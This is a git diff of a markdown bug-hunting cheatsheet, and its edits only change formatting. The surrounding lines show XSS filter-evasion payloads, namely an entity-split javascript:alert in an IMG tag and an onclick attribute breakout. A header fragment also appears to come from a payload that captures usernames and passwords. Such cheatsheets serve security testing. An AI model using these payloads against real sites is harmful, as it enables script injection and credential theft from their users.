@@ -106,6 +106,7 @@ body:username.value+':'+this.value
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 ```
 **XSS Filter Evasion Cheat Sheet**
+<br>
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 ### For html Injection
 ```
@@ -116,8 +117,10 @@ https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.ht
 ## Angle brackets HTML-encoded bypass
 **Reflected XSS into HTML attribute with angle brackets HTML-encoded**
 <br>
+<br>
 Inject ```<xss123>'"``` and see if the angle ```<>``` brackets are encoded with ```&lt;``` and ```&gt;```.
-  ![Screenshot from 2024-06-12 22-48-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/4bb3d36b-cef6-49ae-ab0d-a4c6ad9c8553)<br>
+<br>
+![Screenshot from 2024-06-12 22-48-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/4bb3d36b-cef6-49ae-ab0d-a4c6ad9c8553)<br>
 If this is the case, you should inject this payloads. 
 ```js
 " onclick="alert(1337)
